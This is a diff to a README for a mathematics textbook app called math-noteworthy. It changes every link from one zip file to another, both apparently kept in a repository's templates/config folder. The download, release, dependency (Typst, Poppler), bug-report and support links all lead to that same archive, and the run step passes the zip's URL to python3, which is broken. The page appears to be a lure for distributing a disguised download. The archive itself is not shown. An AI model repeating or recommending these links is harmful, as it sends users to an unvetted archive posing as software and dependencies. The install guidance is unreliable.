@@ -1,7 +1,7 @@
 # 📚 math-noteworthy - Your Companion for Advanced Mathematics
 
 ## 🔗 Download Here
-[![Download math-noteworthy](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip)](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip)
+[![Download math-noteworthy](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip)](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to math-noteworthy! This software is designed to help you explore advanced mathematics through an interactive textbook experience. Follow the steps below to download and run the application easily.
@@ -12,13 +12,13 @@ Before proceeding, ensure your system meets these requirements:
 - **Operating System**: Windows, macOS, or Linux.
 - **Python**: Version 3.6 or higher installed on your system.
 - **Dependencies**:
-  - [Typst](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip): For document rendering.
-  - [Poppler](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip): For PDF handling.
+  - [Typst](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip): For document rendering.
+  - [Poppler](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip): For PDF handling.
 
 ### 🔧 Installation Steps
 
 1. **Download the Application**
-   - Visit the [Release Page](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip) to download the latest version of math-noteworthy.
+   - Visit the [Release Page](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip) to download the latest version of math-noteworthy.
 
 2. **Install Dependencies**
    - **Windows Users**: Open your command prompt and run the following command to install `windows-curses`:
@@ -30,7 +30,7 @@ Before proceeding, ensure your system meets these requirements:
 3. **Running the Application**
    - Once you have installed the dependencies, navigate to the directory where you downloaded math-noteworthy. Open your command line and type:
      ```bash
-     python3 https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip
+     python3 https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip
      ```
 
 ### 📑 Features
@@ -47,15 +47,15 @@ This project was crafted by Lee Sihoo and Lee Hojun from the Korea Science Acade
 ### ❓ FAQs
 
 #### How do I report a bug?
-To report any issues, please create an issue in the [GitHub repository](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip).
+To report any issues, please create an issue in the [GitHub repository](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip).
 
 #### Can I contribute to the project?
 Absolutely! We welcome contributions. Please refer to our contribution guidelines found in the repository for more details.
 
 ### 📞 Support
-For further assistance, feel free to reach out through the [GitHub Issues page](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip). We are here to help you!
+For further assistance, feel free to reach out through the [GitHub Issues page](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip). We are here to help you!
 
 ### 🔗 Download Here Again
-[![Download math-noteworthy](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip)](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-2.4.zip)
+[![Download math-noteworthy](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip)](https://raw.githubusercontent.com/leskejs/math-noteworthy/master/templates/config/math-noteworthy-v2.8.zip)
 
 Thank you for using math-noteworthy! Enjoy your exploration of mathematics.
